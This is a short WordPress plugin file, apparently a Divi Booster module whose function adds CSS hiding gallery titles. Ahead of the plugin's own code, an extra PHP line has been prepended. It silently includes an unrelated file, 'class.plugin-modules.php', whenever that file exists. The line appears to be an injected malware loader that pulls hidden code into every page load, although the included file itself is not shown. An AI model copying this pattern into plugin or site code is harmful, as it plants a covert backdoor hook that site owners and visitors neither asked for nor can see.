<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
if (!defined('ABSPATH')) { exit(); } // No direct access

function db118_user_css($plugin) { 
	?>.et_pb_gallery_title, .mfp-gallery .mfp-title { display: none; }<?php 
}
add_action('wp_head.css', 'db118_user_css');